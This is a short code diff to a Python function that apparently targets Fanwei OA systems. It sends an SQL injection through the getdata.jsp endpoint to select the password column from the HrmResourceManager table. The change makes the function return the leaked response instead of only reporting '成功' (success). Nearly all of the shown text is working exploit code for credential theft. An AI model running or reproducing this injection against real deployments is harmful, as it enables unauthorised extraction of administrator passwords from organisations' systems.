@@ -15,7 +15,7 @@ def fanwei_OA_sql(url, timeout=6):
         re = requests.get(url + '/js/hrm/getdata.jsp?cmd=getSelectAllId&sql=select%20password%20as%20id%20from%20HrmResourceManager', timeout=timeout)
         # print(re)
         if re.text and not 'Error 404 Not Found' in re.text:
-            return '成功'
+            return '成功'+re.text
     except ConnectionError as e:
         return '连接失败'
     except TimeoutError as e:
